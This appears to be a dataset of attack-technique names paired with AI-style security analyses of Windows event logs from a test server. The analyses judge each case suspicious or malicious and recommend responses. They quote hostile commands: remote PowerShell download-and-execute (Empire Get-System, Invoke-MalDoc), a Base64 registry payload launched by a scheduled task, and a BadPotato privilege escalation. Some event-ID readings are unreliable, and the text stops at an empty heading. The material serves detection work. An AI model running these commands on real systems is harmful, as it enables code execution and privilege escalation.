### Indicators of Malicious Activity:
1. **Privilege Escalation and Account Modification:**
   - **Powershell Execution (Sysmon Event ID 1 and Windows PowerShell Logs):**
     - A PowerShell script is being executed (`EventID"":""17978`) with commands involving randomization and renaming of local user accounts, specifically targeting the ""Administrator"" account.
     - The PowerShell command involves retrieving local group members of ""Administrators"" and renaming any accounts containing ""Administrator"" to a random name (`HaHa_$x$y$z`). This behavior is indicative of an attempt to obfuscate actions and hide the original account.
   - **Security Event Logs (Event ID 4781):** 
     - An account with the username ""Administrator"" is renamed to ""HaHa_23874851854"", aligning with the PowerShell script aimed at modifying administrator account details.

2. **Unusual PowerShell Activity (Event ID 4799):**
   - Multiple ""4799"" events are logged in close succession involving the user ""admin_test"" executing PowerShell commands, likely part of the same script that led to account renaming.
  
3. **Suspicious Command Execution:**
   - Commands executed by ""admin_test"" contain administrative privileges and include potentially dangerous privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others noted in the `Security Log (Event ID 4672)`. The presence of these privileges suggests elevated attempts that deviate from standard operations.

### Assessment and Conclusion:
- **Malicious:** The evidence indicates a targeted and deliberate attempt to modify and possibly exploit administrative user accounts through the use of a PowerShell script. The actions involve privilege escalation and modifying account properties, which align with malicious intent aimed at maintaining unauthorized access or disrupting legitimate administrative functions.
  
### Guidance on how to proceed:
1. **Immediate Mitigation Steps:**
   - Disable or reset any accounts that were modified or created suspiciously, especially those named with the ""HaHa"" prefix.
   - Review and reset permissions and roles for all administrative accounts.
   - Block and audit IP addresses or devices involved in executing the suspicious commands.

2. **Further Investigation:**
   - Conduct a thorough audit of system logs to trace the origin of the malicious PowerShell script.
   - Inspect the environment for any additional indicators of compromise, including unexpected changes in other user accounts or configurations.
   - Utilize endpoint detection and response (EDR) solutions to further assess the system's integrity and prevent similar attacks.

3. **Strengthening Security Posture:**
   - Implement strict access controls and regularly review privileged access to sensitive systems.
   - Enhance logging and monitoring mechanisms to detect such anomalies early.
   - Educate users on the importance of recognizing phishing attempts and secure credential management.

The detected activity, coupled with account manipulation and privilege escalations, warrants this as a high-priority security incident requiring immediate attention."
Scheduled task Local,"Upon reviewing the provided Windows event logs, several points of interest and potential indicators of compromise are noted. Below is a comprehensive analysis:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - The logs show repeated executions of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`. Wevtutil is a legitimate tool used for exporting or clearing Windows Event logs, and conhost.exe is used as part of the console window infrastructure.
   - The repeated execution with the same timing and frequency suggests potential log tampering or other malicious intent, especially since these utilities are not typically used frequently in sequence in such a manner.

2. **Execution of `cmd.exe` with Scheduled Task Creation:**
   - A process `cmd.exe` was executed with the command line: `""cmd.exe"" /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10`.
   - This command creates a scheduled task named ""spawn"" to execute `cmd.exe` at a specified time. This behavior is often associated with persistence mechanisms used by attackers to maintain access to a compromised host.

3. **Use of `whoami.exe` and `hostname.exe`:**
   - Executing `whoami.exe` and `hostname.exe` are legitimate actions, but they can also indicate an attacker trying to gain information about the system and the privileges they have achieved.

4. **Suspicious Logon Events:**
   - Event ID `4624` and `4672` logs indicate successful logins with elevated privileges, including privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are typically leveraged by attackers for privilege escalation and persistence.

5. **No Clear Indicators of Typical Malware Execution:**
   - There is an absence of typical malware execution patterns, such as unusual binary paths, or suspicious hashing. However, the scheduling of tasks and handling of logs raises concerns.

**Assessment:**

Given the repeated and frequent use of wevtutil and conhost in conjunction with actions typically associated with persistence and privilege escalation (Scheduled Task creation for `cmd.exe` and elevated privilege logins), these logs suggest suspicious behavior. There are no outright indicators of definite compromise such as clear malware execution, but the activity certainly warrants further investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

- Perform a thorough investigation on the origin of the commands associated with `wevtutil.exe` and why event logs are potentially being tampered with.
- Investigate the context and user activity around the creation and use of scheduled tasks. Determine if these tasks were expected or sanctioned administrative tasks.
- Conduct a full security audit and consider enhanced monitoring on `SERVER002` for any further anomalous activity.
- Review administrative policies and permissions for the user `admin_test` to ensure they align with job duties and are not being misused.
- Carry out threat hunting exercises to look for further indicators of compromise or other suspicious activities across the network.

Given the activity described, a more detailed investigation will help discern whether this is a potential compromise or benign activity driven by an internal process or individual."
Process Injection with Go using CreateThread WinAPI,"Upon analyzing the provided logs, the following observations can be made:

1. **Application Log:**
   - The entries here are related to the status of Windows Defender and the Software Protection Platform Service. Both of these logs appear normal, indicating that these services are active and functioning as expected.

2. **Windows PowerShell Log:**
   - There is a series of PowerShell events indicating the execution of a command that involves `CreateThread.exe` with a `-debug` argument. The execution from a temporary directory, especially in a path resembling `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\` can be indicative of malicious activity, as legitimate applications typically avoid such locations for execution. This behavior is suspicious and warrants further investigation to verify the intent and the legitimacy of the executable.

3. **Security Log:**
   - The time change events (`EventID 4616`) indicate a time change being performed by `svchost.exe`. The events do not, by themselves, suggest malicious activity but can be concerning if they were done without clear administrative intent. It's important to verify if this action was authorized, as unauthorized time changes can be used to evade security log timelines.

4. **Sysmon Log:**
   - The execution of `wevtutil.exe` and `conhost.exe` in close succession might suggest log file querying or clearing, possibly to cover tracks. Execution of administrative commands like `whoami.exe` and `hostname.exe` from high integrity level accounts is seen, which is common if an attacker is trying to enumerate the host environment.
   - The specific PowerShell command seen previously in the Windows PowerShell logs (`CreateThread.exe -debug`) is also captured here (Event ID 1 for process creation). This correlation across logs strengthens the suspicion that this executable may be intended for malicious purposes.

5. **System Log:**
   - The time zone and time synchronization events are typically normal but, in this context, might suggest tampering if seen alongside other suspicious activities. Again, this should be verified for legitimacy in the context of administrative actions.

**Assessment and Conclusion:**

Based on the analysis of the logs, there is evidence of potentially suspicious behavior:

- PowerShell initiating a potentially unauthorized and suspicious executable from a temporary directory.
- The timing change via `svchost.exe` needs to be corroborated with authorized administrative activities.
- Execution patterns in Sysmon logs raise the suspicion of potential reconnaissance or preparatory actions for further malicious operations.

**Overall Resolution:**
- **SUSPICIOUS**: Given the observed behavior, particularly around PowerShell execution and the use of `CreateThread.exe`, these activities appear suspicious and warrant deeper investigation to confirm or dispel any malicious intent. More context and investigation into the legitimacy and contents of the executables involved would be prudent before making a definitive conclusion."
Remote Service Installation CMD,"Upon reviewing the provided Windows event logs, a series of activities can be identified that warrant attention due to potential indicators of malicious activity:

### Analysis:

1. **Execution of PowerShell**:
   - A process with the `Image` path `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` executed by `SERVER002\\admin_test`. While PowerShell is a legitimate administration tool, its use is often scrutinized for improper use by malicious actors.
   
2. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
   - Multiple entries showing execution of `C:\\Windows\\System32\\wevtutil.exe` and `C:\\Windows\\System32\\conhost.exe`. While these are standard Windows processes, frequently spawning multiple instances in a short time frame can be suspicious, especially if not in line with regular operations.

3. **Execution of Command and Control Tools**:
   - A `cmd.exe` process is observed executing a command related to `sc.exe` to create and start a service named `fileTestService_CMD`. The service is pointing to an executable located in a temporary directory, `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\fileService.exe`, which is unusual for legitimate system services that typically reside in system directories.

4. **Creation of a Suspicious Service**:
   - The System log records the creation of `fileTestService_CMD` as an `auto start` service using the account `LocalSystem`. This pattern is often used to persistently maintain system access.

5. **No corroborating Security or PowerShell logs**:
   - Absence of additional logs (PowerShell, direct Security logs) capturing more detail complicates directly identifying malicious command specifics or correlating interactive sessions by the admin.

### Conclusion:

The execution pattern and the creation of a service from a temporary folder, combined with the systemic use of command utilities such as `wevtutil.exe`, `cmd.exe`, and `sc.exe`, strongly suggest signs of scripting and potential persistence techniques typically not associated with regular administrative activity or user behavior.

Considering these findings, it's prudent to categorize this case as **SUSPICIOUS**, given the unusual behavior that suggests further investigation is warranted. This can include:
- Conducting a deep analysis of `fileService.exe` to verify if it's benign or malicious.
- Reviewing user account activities and permission changes during the given time.
- Cross-referencing with network logs for unusual outbound communications.
- Implementing strict monitoring to identify the potential resurgence of similar patterns.

The additional logging and a comprehensive review of the host machine should be performed to confirm the malicious nature or benign intent of these actions."
Task Scheduler via VBA,"After thoroughly analyzing the provided logs from the Windows host, I've identified several points of concern which suggest potential malicious activity. Here's the detailed analysis:

### PowerShell Log Analysis:

1. **Suspicious PowerShell Command:**
   - The PowerShell log entries reveal a series of commands executed using `PowerShell.exe` with the following characteristics:
     - **Downloaded Script:** Using `iwr` (Invoke-WebRequest) and `IEX` (Invoke-Expression) to pull and execute a script from `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`.
     - **Command Execution:** The script executes `Invoke-MalDoc`, targeting a macro file located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.005\src\data.005-macrocode.txt`.
   - **Analysis:** This download and execution from an external URL, especially from a publicly accessible source like GitHub, is highly suspicious and aligns with known methods for downloading and executing potentially malicious scripts or malware payloads.

### Sysmon Log Analysis:

2. **Process Execution:**
   - Multiple processes were initiated in quick succession with `powershell.exe` among them. They include both PowerShell executions and use of `wevtutil.exe` for exporting logs, indicating potential log manipulation or exfiltration:
     - Starting `powershell.exe`, and conhost.exe soon after suggests a script or a batch process potentially automated or scripted activity.
     - The execution of `wevtutil.exe` to export event logs (`C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx`) could indicate attempts to cover tracks or prepare for data extraction.
   
3. **High Integrity Level Executions:**
   - Processes are running with `High` integrity level, indicating elevated permissions, possibly through privilege escalation.

4. **Command Line Arguments:**
   - The complex command-line patterns in PowerShell and other process executions are commonly used in malicious activities where the attacker attempts to evade detection and execute hidden scripts.

### Context and Indicators of Compromise:

- The suspicious downloading and invocation of scripts from an external source indicate a breach attempt or ongoing compromise.
- Exportation of sysmon logs using `wevtutil.exe` further indicates potential cleanup and data exfiltration activity.
- These activities are conducted under the context of an administrator `admin_test`, which suggests successful privilege escalation.

### Conclusion:

The activities captured in the logs strongly suggest indicators of malicious activity rather than a benign series of operations. Given the evidence:

- Unauthorised script execution from an external source.
- Use of PowerShell to execute downloaded scripts.
- Potential manipulation of logs.
  
### Resolution: **MALICIOUS**

### Recommendations:

1. **Isolate the Infected Host:** Disconnect `Server002` from the network to prevent further spread or exfiltration.
2. **Conduct a Detailed Forensic Analysis:** Investigate file modifications, network connections, and further log analysis to understand the full extent of compromise.
3. **Revoke and Reset Admin Credentials:** Immediately change passwords and revoke credentials for `admin_test`.
4. **Review and Tighten Network Activities:** Monitor for additional unusual network activities and establish stricter access controls on PowerShell usage and web requests.
5. **Update and Patch Systems:** Ensure all systems are up-to-date with the latest security patches to mitigate known vulnerabilities."
Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"Upon analyzing the provided Windows event logs, several entries appear to exhibit potentially suspicious behavior that could indicate possible malicious activity:

1. **PowerShell Logs**:
   - We see events indicating the execution of PowerShell scripts creating a directory and copying the `calc.exe` to a temporary location, followed by setting a registry key to point to this location via the `Set-ItemProperty` command. This behavior suggests an attempt to persist this executable by adding it to the startup through the registry, a method commonly used by malware to maintain persistence on a compromised system.

2. **Security Logs**:
   - A `4624` logon event for `admin_test` occurs with NTLM authentication from an external workstation (`DESKTOP-3HL5B2P`), which could suggest lateral movement or unauthorized access if this behavior is not expected or regular for this user.
   - Elevated privileges are also granted shortly after (`4672`), involving privileges typically used for administrative tasks which if done by an unauthorized user could be a sign of privilege escalation.

3. **System and Time Change Logs**:
   - The `4616` event logs reveal system time changes, which could potentially be unnerving if these actions weren't expected as altering system time could be a tactic used to cover tracks by muddling timelines of logs.

4. **Sysmon Logs**:
   - Various legitimate Windows processes (`wevtutil.exe`, `conhost.exe`, `whoami.exe`) and PowerShell are executed by the user `SERVER002\admin_test`. The use of PowerShell aligns with the earlier activities noted in the PowerShell logs.
   - Activities involving `Sysmon` logs showing the execution of these utilities in quick succession can be a normal administrative task but given the context of other suspicious behavior, raises questions about system tampering or reconnaissance activity by a potential adversary.

### Assessment

- The logs show activities consistent with suspicious and potentially malicious behavior:
  - Use of PowerShell to make system changes and modify the startup registry key.
  - Authentication patterns showing potential for lateral movement or unauthorized access.
  - System time alterations without a plausible reason logged in context.

Given these observations, the resolution for this investigation is **MALICIOUS**. 

### Recommendations

1. **Immediate actions** should be taken to isolate and investigate the system `Server002` to understand the full scope of compromise and prevent further potential malicious actions.
   
2. **Review access logs** and authentication attempts to understand if `admin_test` credentials have been compromised or were misused.

3. **Inspect registry** keys and startup configurations to revert any unauthorized modifications.

4. **Investigate the source** of the external connections and communications from `DESKTOP-3HL5B2P` to verify legitimacy.

5. **Harden PowerShell script execution policies** to restrict unauthorized script execution.

6. **Conduct a thorough threat hunt and forensic analysis** on the affected systems to find any other indicators of compromise and to ensure no further persistence mechanisms are in place.

7. **Inform relevant stakeholders and increase monitoring** on potentially affected systems while taking further mitigation actions.

These actions are crucial to contain and remediate the threat while reducing the risk of further compromise."
Azure - adding user to Azure role in subscription,"Based on the analysis of the provided Windows event logs across different channels, several indicators may suggest malicious activity:

1. **Suspicious Account Activity:**
   - Multiple Account Discovery (Event ID 4798): Multiple instances of Event ID 4798 show account name enumeration (e.g., Administrator, admin_test, Guest, etc.) using `CompatTelRunner.exe`. This typically occurs when trying to discover account details, which can be indicative of reconnaissance activity within a network.
   
2. **Unusual Execution Context:**
   - `CompatTelRunner.exe` running with SYSTEM privileges (Event ID 4624) appears to operate in a manner that suggests it might be leveraged maliciously, especially seeing it associated with account enumeration.

3. **Suspicious PowerShell Activity:**
   - `PowerShell.exe` (Sysmon Event ID 1 and PowerShell Event ID 600) executing a script attempting to connect to `AzAccount` and perform actions such as `New-AzRoleAssignment`. This activity attempts to establish Azure credentials and modify role assignments, which is highly suspicious and potentially dangerous, especially if it intends to escalate privileges or manipulate cloud resources.

4. **Sysmon Logs Indicating Process Execution:**
   - Execution of `powershell.exe`, `wevtutil.exe`, and other management tools, particularly connecting, interacting with, or managing subscriptions/assignments (e.g., `New-AzRoleAssignment`), should be scrutinized as these could potentially align with lateral movement or privilege escalation techniques, often used in attacks.

5. **Privilege Escalation:**
   - Event ID 4672, which logs the assignment of special privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others to the SYSTEM account. This activity is also present, which combined with others, could elevate the threat level.

**Assessment:**
- Given the combination of account enumeration activities, PowerShell scripts related to Azure that could be modifying cloud infrastructure, and the presence of administrative privileges being used/misused, the activities recorded in the logs exhibit characteristics of a potential breach attempt or insider attack scenario.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent further spread or data exfiltration.

2. **Further Investigation:**
   - Conduct a detailed forensic analysis of `CompatTelRunner.exe` and PowerShell scripts to understand the exact scope and intent of the activity.
   - Review any Azure account changes, role assignments, and access logs to spot unauthorized modifications.

3. **Post-Incident Review:**
   - Have a complete audit of the user accounts to verify integrity and reset passwords where necessary.
   - Strengthen monitoring on similar patterns for early detection of potential breaches.

4. **Security Enhancement:**
   - Implement strict PowerShell execution policies and auditing within the organization.
   - Introduce behavioral monitoring tools to catch and alert on similar suspicious activities in the future.

By following the recommended actions, you can ensure your organization's systems are protected against ongoing or future malicious attempts."
Scheduled Task Executing Base64 Encoded Commands From Registry,"Upon analysis of the provided Windows event logs, several observations can be made.

### System Log
- The system log entries primarily involve time change events, which are typically benign. The changes are consistent with adjustments to system time and synchronization with time.windows.com. There is no indication of unauthorized changes or privilege escalation associated with these entries.

### Application Log
- A log entry from the Software Protection Platform Service appears, which is routine for managing Windows licensing. There is no indication of irregular activity or compromise.

### Security Log
- The security logs indicate additional time change events but do not reflect unauthorized modifications or suspicious behavior. Changes to time parameters such as `PreviousTime` and `NewTime` are consistent with the entries from the System log.

### Sysmon Log
- The Sysmon logs show various processes being executed, such as svchost.exe, wevtutil.exe, conhost.exe, and others.
- Notably, there is an execution of cmd.exe with a complex command, where a registry key is modified with Base64-encoded data, which is later used to create a scheduled task that involves executing a PowerShell command. This activity is highly suspicious.
  
  ```plaintext
  ""cmd.exe"" /c reg add HKCU\SOFTWARE\file-data.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""file-data.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\file-data.005).test)))"" /sc daily /st 07:45
  ```

  This action indicates an attempt to execute potentially malicious code and suggests the encoding and obfuscation of the command are used to avoid detection. Creating scheduled tasks using encoded commands to execute scripts is a common tactic used by attackers.

### Assessment
Based on the detailed analysis, there are indicators of potentially malicious activity present in the Sysmon log section. Although the time changes in the System and Security logs appear benign, the specific command and action involving the registry and PowerShell execution require attention.

### Resolution
**MALICIOUS**: The execution pattern and intent suggest malicious activity as the complex command employed aims to execute PowerShell script obscured by encoding. Immediate investigation and remediation are recommended.

### Recommended Actions
1. **Isolate the System**: Temporarily remove the affected host from the network to prevent any further spread or exploitation.
2. **Investigate Scheduled Tasks**: Review and disable any recently created or unauthorized scheduled tasks, especially those matching the identified malicious pattern.
3. **Decode the Command**: Decode the Base64 command to understand the intent and content of the PowerShell script.
4. **Review Registry Changes**: Check for unauthorized registry modifications and restore any affected keys.
5. **Conduct a Forensic Analysis**: Perform a deeper forensic analysis to determine if additional systems are affected and to identify the entry vector.
6. **Update Security Measures**: Ensure all security tools are updated with the latest signatures, and review network defense strategies.
7. **Alert and Inform Security Teams**: Notify the incident response team and relevant stakeholders to coordinate a comprehensive response plan.

Taking these steps will help mitigate potential damages and strengthen the host's security posture moving forward."
Domain Password Policy Check: No Special Character in Password,"### Detailed Analysis and Assessment of Logs

#### **Windows PowerShell Logs**
The PowerShell logs indicate an execution attempt to change a user's password utilizing a stored credential file. Key points from the logs:
- **Script Execution**: The PowerShell script checks for a credential file in the environment's local app data path. If the file exists, it compares the password within the credential with a specified password (`UpperLowerLong333noSpecialChar`).
- **Password Change Logic**: If the passwords do not match, the script attempts to set a new AD account password. If there's an error, the script provides feedback based on the error code.
- **Credential Handling**: The script writes back the new password as a secure string into a file after a successful password change.

**Concerns**:
- The storage of plaintext passwords in a script is insecure. It's essential to encrypt passwords and manage them through secure methods or platforms.
- The script attempts to set and compare plaintext passwords (`UpperLowerLong333noSpecialChar`), which is a poor security practice.

#### **Sysmon Logs**
The Sysmon logs show multiple executions of processes, including PowerShell, HOSTNAME.EXE, whoami.exe, and Microsoft Edge-related processes:
- **PowerShell Activity**: Initiated by user `SERVER002\admin_test`, consistent with the PowerShell logs provided.
- **Microsoft Edge Update Process**: Normal update processes for Microsoft Edge can trigger events such as setup execution and temporary files being created as part of system maintenance or updates.
- **No Malicious Processes Identified**: All processes logged appear to be legitimate Windows processes or expected software behavior.

**Concerns**:
- No direct evidence of malicious activity, but the presence of multiple conhost.exe instances might indicate attempts to obfuscate activities (though this is common and can be benign depending on context).

#### **Security Logs**
- **Event 4799**: The event describes the addition or modification of user rights or privileges (`S-1-5-32-545` [Users] group), generally indicating a normal operational action or a script execution under SYSTEM context (as observed with Edge updaters).

**Overall Concerns**:
- While there is heavy use of PowerShell, which is commonly used in both administrative tasks and cyber attacks, the specifics of its use here don't immediately indicate compromise.
- The credential handling practices in scripts are vulnerable and should be reviewed to prevent potential security risks.

#### **Assessment and Resolution**
- **Resolution**: **SUSPICIOUS**
  - While no outright malicious actions are identified, the practices observed in the PowerShell scripting (specifically around password management) and the high activity of specific processes raise concern for potential misuse.
  - Recommend further investigation into script handling policies and security practices around credential management.
  - Suggest performing security reviews of user scripts and ensuring audit logs are continually reviewed for similar patterns of activities.

### Recommendations
- **End User Security Training**: Educate users on secure credential management and the risks of plaintext password usage.
- **Script Audit**: Review scripts running on sensitive servers for insecure practices such as plaintext password handling.
- **Enhanced Monitoring**: Institute continuous monitoring and alerting for suspicious PowerShell activities, especially those involving credential access or modification.
- **Access Controls**: Reinforce access controls and ensure only authorized users have the script execution capabilities in sensitive environments."
Bad Potato,"### Analysis of Sysmon and PowerShell Logs

1. **Process Execution and Behavior**:
   - The initial process execution of `SecurityHealthService.exe` (legitimate Windows service) seems normal, running under SYSTEM authority, indicating it is likely part of regular Windows operations and not suspicious.

2. **PowerShell Activity**:
   - There's a notable PowerShell execution: `powershell.exe` executing a script that includes `Start-Process` with `BadPotato.exe` and `notepad.exe`, then terminating both processes.
   - `BadPotato` is a known exploit tool used for privilege escalation on Windows systems, which is typically found in penetration testing or malicious activities.

3. **Subsequent Process Creation**:
   - The logs show consistent use of `conhost.exe` alongside the PowerShell activity, which can be normal but, in this context, should be looked at cautiously given its association with PowerShell and potential misuse for cloaking malicious activities.
   - The logs also show multiple executions of `wevtutil.exe` by `SERVER002\admin_test`, indicating possible interactions with event logs. Although `wevtutil.exe` is used for legitimate purposes like exporting or querying logs, its combination with other observed activities could suggest log tampering or information gathering.

4. **Notable Logs and Times**:
   - The PowerShell log at `2024-10-25 11:33:48.011` showing the start of the command-line sequence that includes `BadPotato` and subsequent activity ending at `2024-10-25 11:34:06.648` corresponds with the Sysmon logs, confirming the activity took place and was carried out by the `admin_test` user.

5. **Other System and Application Logs**:
   - The Application logs show nominal Windows Defender operations indicating security measures were in effect, but do not highlight any interception of the described activity, which is not unexpected if the actions are designed to evade detection.

### Assessment

- **Indicators of Malicious Activity**:
  - The use of `BadPotato.exe` through PowerShell is a significant indicator of potentially malicious activity, specifically targeting privilege escalation on Windows.
  - The combination of the PowerShell and potential log manipulation tools (`wevtutil.exe`) suggests an intention to escalate privileges and potentially cover tracks, which aligns with techniques used by attackers after gaining an initial foothold.

### Conclusion

- **Resolution: MALICIOUS**
  - The execution of `BadPotato.exe` for privilege escalation through PowerShell substantiates the classification of this activity as malicious, and immediate action is required.

### Guidance

1. **Immediate Actions**:
   - Isolate the affected system, `Server002`, from the network to prevent potential lateral movement or further command execution.
   - Conduct a full security audit of `admin_test` user activities across the organization to ensure no other systems have been compromised.
   - Expedite the analysis of memory dumps and deeper forensic investigation on the system to capture any artifacts that can help in understanding the full extent of the compromise.
   
2. **Additional Precautions**:
   - Strengthen logging and monitoring for unusual PowerShell usage across all systems.
   - Implement strict application whitelisting to prevent execution of unapproved binaries such as `BadPotato.exe`.
   - Regularly train IT staff on identifying and responding to incidents involving such exploits."
Add a driver,"Upon analyzing the given Windows event logs from the host machine (Server002), here's a detailed analysis highlighting any suspicious activities or signs of potential compromise:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`**:
   - The logs record multiple instances of `wevtutil.exe` and `conhost.exe` being executed within a very short time frame by the user `SERVER002\\admin_test`. While `wevtutil.exe` is a legitimate utility used for interacting with event logs, its repeated execution can be suspicious, especially if not typically performed by users under normal operating conditions or if the user is not performing direct administrative or troubleshooting tasks.
   - `conhost.exe` is a Console Window Host, which generally acts as a helper for command-line tools. Its frequent spawning aligned with `wevtutil.exe` could indicate automated scripting or attempts to programmatically manipulate event logs.

2. **Execution of `HOSTNAME.EXE` and `whoami.exe`**:
   - The execution of `hostname.exe` and `whoami.exe` is observed. While these utilities are also standard system tools, they are often used in scripts or by attackers to gather system-specific information. Their occurrence should be matched against known baseline behaviors to assess their legitimacy.

3. **Command-Line Activity Involving `cmd.exe` and `pnputil.exe`**:
   - There is an execution of `cmd.exe` using the command line: `""cmd.exe"" /c pnputil.exe /add-driver ""C:\\Windows\\INF\\usbstor.inf""`. The use of `pnputil.exe` to add a USB storage driver (`usbstor.inf`) via a command prompt suggests potential preparation for data exfiltration or introducing new drivers without user interaction, which can be indicative of suspicious behavior if not initiated by legitimate administrative tasks.

4. **Time Manipulation Detected**:
   - The logs indicate the Windows Time service (W32Time) adjusted the system time backward slightly (Log Entry with Event ID: 4616 in the Security log and corresponding Kernel-General events). Although not conclusively malicious on its own, time manipulation can be used in sophisticated attacks to disrupt log visibility or timeline analysis.

5. **Unusual Privileges and Integrity Levels**:
   - Several processes executed at High Integrity levels, including `pnputil.exe`, `cmd.exe`, and others. While not inherently malicious, elevated integrity levels coupled with the context of the commands executed may need closer examination to ensure they align with expected activities for `SERVER002\\admin_test`.

### Assessment:

- **Risk Level**: The combination of factors such as automated or frequent executions of logging utilities (wevtutil and conhost), timing irregularities combined with uncommon driver activity, suggests beyond benign regular system use.
- **Threats Identified**: Potential system reconnaissance, log manipulation, or preparation for unauthorized system changes or data exfiltration.

### Conclusion:

This activity appears **SUSPICIOUS**. Although the events could potentially correspond to legitimate administrative or troubleshooting tasks, the frequency, pattern, and nature of system interactions warrant further investigation to rule out unauthorized access or malicious activity.

### Recommended Next Steps:

- **Correlate with Security Baseline**: Check these activities against normal user and system behavior patterns for `SERVER002`.
- **Investigate User Actions**: Verify with `SERVER002\\admin_test` or stakeholders the contextual legitimacy of the commands executed.
- **Conduct Endpoint Security Scanning**: Use endpoint protection tools to scan for any signs of malware or unauthorized access tools.
- **Enhance Monitoring**: Increase log monitoring and alerting for similar activities on this and other hosts in the network to catch potential malicious activity early.
- **Audit System Changes**: Conduct a thorough audit of recent system and application changes to ensure all are authorized."
Named pipe client impersonation,"Upon analysis of the provided log entries across various channels (Application, PowerShell, Security, Sysmon, and System), I have identified potential indicators of malicious activity primarily revolving around the PowerShell events.

### Detailed Analysis:

1. **PowerShell Log Analysis:**
   - The PowerShell logs indicate the execution of a script from a remote URL: 
     ```shell
     IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
     ```
   - This command uses `Invoke-Expression` (IEX) to execute a downloaded PowerShell script from the internet, which is a known tactic used in remote code execution and typically seen in attack frameworks such as Empire, used for post-exploitation and privilege escalation.

2. **Sysmon Log Analysis:**
   - The Sysmon logs show a PowerShell process (`powershell.exe`) being spawned in a high integrity level and executing the above script. 
   - There are additional entries showing the command-line execution of Windows built-in utilities like `whoami.exe`, `conhost.exe`, and others within the same session, often indicative of enumeration or running subsequent commands after code execution.

3. **Security Log Analysis:**
   - There are entries showing privilege escalation for the `admin_test` user:
     - Event ID 4672 confirms special privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, which are indicative of admin-level exploits.
   - Logon attempts utilizing NTLM authentication (Event ID 4624), which corresponds to a network logon using the NTLM protocol.

### Indicators of Malicious Activity:

- **Unauthorized PowerShell Script Execution:** The use of a PowerShell script from an external URL indicates potential command and control (C2) activity. This can be indicative of an attacker trying to escalate privileges or maintain persistence.
- **Downloading and Executing Scripts from the Internet:** This is generally suspicious behavior, and especially given the URL associated with BC-SECURITY/Empire, a known penetration testing toolkit often used for malicious activities.
- **Privileged Operations and Commands:** Execution of tools such as `whoami`, `conhost` following the script download strongly suggests reconnaissance or escalation activity.

### Assessment:

- **Resolution:** **MALICIOUS**
  - The PowerShell activity is characteristic of malicious behavior, especially referencing known exploitation frameworks like Empire, which is used for unauthorized access and lateral movement within networks.

### Guidance:

1. **Immediate Incident Response Actions**: 
   - Isolate the affected system (`Server002`) from the network to prevent further unauthorized activity.
   - Block or monitor outbound traffic to the suspicious domain (raw.githubusercontent.com in this case).

2. **Forensic and Malware Analysis**:
   - Further analyze the downloaded script for understanding intent and capabilities.
   - Perform root cause analysis to determine the entry point of compromise.

3. **Audit and Enhance Security Controls**:
   - Implement strict PowerShell script execution policies via Group Policy or security tools.
   - Educate users on security best practices to prevent phishing and secure usage of PowerShell.
   - Regularly update systems and monitoring for anomalous behavior."
RunPE via VBA,"### Analysis of the Logs

Upon reviewing the provided logs, several key activities raise concerns and warrant further investigation:

1. **Suspicious PowerShell Activity**:
   - Multiple entries in the Windows PowerShell log indicate the execution of a PowerShell script with the command: `powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) Invoke-MalDoc -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\src\data.012-macrocode.txt"" -officeProduct ""Word"" -sub ""Exploit""}`.
   - The script is downloaded and executed directly from the internet (GitHub), which is extremely risky, typically indicative of malicious activity, as this command downloads and executes a script with a name associated with known malicious attacks (`Invoke-MalDoc`).

2. **Sysmon Events**:
   - The Sysmon logs show numerous process creations involving `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and others under the user context of `SERVER002\admin_test`. The context suggests actions being executed by what seems to be an administrative user, potentially the same user who executed the suspicious PowerShell activity.
   - The creation of `wevtutil.exe` with command-line arguments indicating an export of event logs to a temporary directory without a legitimate operational context can suggest log tampering or data exfiltration.

3. **Privileges and Logon Events**:
   - Security logs reveal events (Event IDs 4624 and 4672) related to logon activities and privilege escalation (SeDebugPrivilege, SeTakeOwnershipPrivilege defined as privileges).
   - Though these may occur in a typical administrative task, when paired with the presence of potentially malicious PowerShell scripts, it strongly indicates malicious intent or actions.

4. **Repeated Credential Access Failures**:
   - There are multiple Event ID 5379 logs where an attempt to access credentials or perform actions results in a failure code `3221226021`, indicating potential unauthorized or failed access attempts.

### Conclusion

Based on the detailed analysis of the logs, the presence of direct script execution from an internet source using PowerShell, combined with potentially unauthorized attempts to manipulate system logs and access administrative credentials, indicate strong signs of compromise. Such activities are consistent with known attack vectors where PowerShell is used to execute malware scripts, potentially aimed at data exfiltration or lateral movement within the network.

### Resolution

